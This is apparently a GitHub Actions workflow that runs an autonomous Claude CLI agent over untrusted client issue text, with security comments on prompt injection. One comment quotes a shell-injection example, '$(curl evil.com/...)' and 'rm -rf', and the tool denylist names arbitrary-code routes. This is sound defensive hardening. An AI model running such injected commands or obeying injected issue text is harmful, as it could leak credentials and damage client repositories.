name: Solver Agent (S3)

on:
  # Backend fires this immediately after a client submits a new issue
  # (see backend/auth_service/services/solver_dispatch.py). Primary
  # trigger — typical latency from issue submit to workflow start ~30s.
  repository_dispatch:
    types: [solver-tick]
  # Hourly safety net for: failed dispatches (token expired, GH API
  # blip), retries on previously-failed issues, stale claim cleanup,
  # manual DB inserts. Minute 7 to avoid top-of-hour cron congestion.
  schedule:
    - cron: '7 * * * *'
  workflow_dispatch:
    inputs:
      egress_policy:
        description: "harden-runner egress policy. Use 'audit' for a one-off run to capture any missing endpoints, then switch back to 'block'."
        type: choice
        default: block
        options:
          - block
          - audit

concurrency:
  group: solver-agent
  cancel-in-progress: false

jobs:
  solve:
    runs-on: ubuntu-latest
    timeout-minutes: 35

    permissions:
      contents: read

    steps:
      # SECURITY (SEC-001 / SEC-056): the Claude step runs an autonomous agent over
      # UNTRUSTED client issue text with the Claude OAuth credential on the runner.
      # Block all outbound network except the exact hosts this job needs, so a
      # prompt-injected agent cannot exfiltrate that credential to an attacker host
      # even if it manages to execute code. egress-policy is 'block' for the real
      # (repository_dispatch / schedule) triggers; a manual run can pass
      # egress_policy=audit once to capture any endpoint the allowlist is missing
      # (StepSecurity prints the observed destinations), then switch back to block.
      - name: Harden runner (egress allowlist)
        uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
        with:
          egress-policy: ${{ github.event.inputs.egress_policy || 'block' }}
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            codeload.github.com:443
            objects.githubusercontent.com:443
            release-assets.githubusercontent.com:443
            pypi.org:443
            files.pythonhosted.org:443
            registry.npmjs.org:443
            api.anthropic.com:443
            statsig.anthropic.com:443
            xeluydwpgiddbamysgyu.supabase.co:443
            cms-backend-roman.vercel.app:443
            slack.com:443

      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.13'
          cache: pip
          cache-dependency-path: agents/Solver - Issues/requirements.lock

      - name: Install agent deps
        run: |
          cd "agents/Solver - Issues"
          pip install --require-hashes -r requirements.lock

      - name: Claim next issue
        id: claim
        run: python "agents/Solver - Issues/claim_issue.py"
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          DISPATCH_ISSUE_ID: ${{ github.event.client_payload.issue_id }}

      - name: Clone client repo
        if: steps.claim.outputs.has_issue == 'true'
        run: python "agents/Solver - Issues/clone_repo.py"
        env:
          SOLVER_GITHUB_TOKEN: ${{ secrets.SOLVER_GITHUB_TOKEN }}

      - name: Install Claude CLI
        if: steps.claim.outputs.has_issue == 'true'
        # Installs the official `claude` CLI from npm. The CLI ships as a Node
        # package so we use npm (already present on ubuntu-latest runners).
        run: |
          npm install -g @anthropic-ai/claude-code@latest
          claude --version

      - name: Pre-write Claude credentials
        if: steps.claim.outputs.has_issue == 'true'
        # Same file `claude setup-token` writes locally. Standalone CLI reads
        # it for subscription-OAuth auth. Quoted heredoc so any `$` in the
        # token is treated literally (defense-in-depth; tokens shouldn't
        # contain `$` but it's free safety).
        run: |
          mkdir -p "$HOME/.claude"
          cat > "$HOME/.claude/.credentials.json" <<'EOF'
          {"claudeAiOauth": {"accessToken": "${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}", "subscriptionType": "max"}}
          EOF
          chmod 600 "$HOME/.claude/.credentials.json"

      - name: Run Claude headless against client repo
        id: claude
        if: steps.claim.outputs.has_issue == 'true'
        # Direct CLI invocation. No middleware (replaces anthropics/claude-code-action@v1
        # which has broken OAuth wiring — see issues #1026, #1281). The CLI
        # itself handles OAuth correctly via the credentials file above.
        #
        # SECURITY: prompt is piped via stdin, NOT command-substituted. The
        # prompt file is built from client-submitted issue title + description
        # in claim_issue.py — a hostile client could otherwise inject
        # $(curl evil.com/...) or `rm -rf` into bash via $(cat). The issue text
        # is additionally nonce-fenced as untrusted data in claim_issue.py.
        #
        # SECURITY (SEC-001): the issue text is untrusted client input and a
        # prompt-injection payload could steer the model. The allowed-tools list
        # is therefore an EXACT verification-only allowlist — it must NOT contain
        # `Bash(node:*)` (matches `node -e "<arbitrary JS>"` = RCE) or a wildcard
        # `Bash(npm run *:*)` (runs arbitrary scripts). Only the specific
        # lint/typecheck/test commands the protocol uses are permitted. The
        # cross-tenant SOLVER_GITHUB_TOKEN is kept OUT of this step (it is not in
        # env here, and repo.py strips it from ./client-repo/.git/config after
        # cloning), so it is not reachable even if the model is injected.
        #
        # Captures the CLI exit code so finalize.py can distinguish "agent
        # crashed" (exit ≠ 0) from "agent exited normally with no diff" (exit
        # = 0, no /tmp/agent-status.md, no file changes). Without this split,
        # all silent exits look identical in Slack.
        env:
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
        run: |
          cd ./client-repo
          set +e
          claude --print \
            --model claude-opus-4-8 \
            --max-turns 80 \
            --allowed-tools "Read,Edit,Write,Glob,Grep,Bash(npm run lint:*),Bash(npm run typecheck:*),Bash(npm test:*),Bash(npx tsc:*),Bash(git diff:*),Bash(git status:*),Bash(git show:*)" \
            --disallowed-tools "Bash(git push:*),Bash(git commit:*),Bash(rm:*),Bash(node:*),WebFetch,WebSearch" \
            < /tmp/agent-prompt.md
          EXIT_CODE=$?
          set -e
          echo "exit_code=${EXIT_CODE}" >> "$GITHUB_OUTPUT"

      - name: Wipe Claude credentials
        if: always() && steps.claim.outputs.has_issue == 'true'
        # SECURITY (SEC-001): remove the OAuth credentials file as soon as the
        # untrusted agent run is over, so it cannot linger into later steps.
        # `always()` so it runs even if the Claude step errored or timed out.
        run: rm -f "$HOME/.claude/.credentials.json"

      - name: Commit, push, mark done
        if: steps.claim.outputs.has_issue == 'true'
        run: python "agents/Solver - Issues/finalize.py"
        env:
          SOLVER_GITHUB_TOKEN: ${{ secrets.SOLVER_GITHUB_TOKEN }}
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          CMS_API_TOKEN: ${{ secrets.CMS_API_TOKEN }}
          CMS_BACKEND_URL: https://cms-backend-roman.vercel.app
          CLAUDE_EXIT_CODE: ${{ steps.claude.outputs.exit_code }}
          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
          SLACK_ISSUES_CHANNEL_ID: ${{ secrets.SLACK_ISSUES_CHANNEL_ID }}

      - name: Release on failure
        if: failure() && steps.claim.outputs.has_issue == 'true'
        run: python "agents/Solver - Issues/release_issue.py"
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          SOLVER_MAX_RETRIES: '3'
          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
          SLACK_ISSUES_CHANNEL_ID: ${{ secrets.SLACK_ISSUES_CHANNEL_ID }}
          CMS_API_TOKEN: ${{ secrets.CMS_API_TOKEN }}
          CMS_BACKEND_URL: https://cms-backend-roman.vercel.app
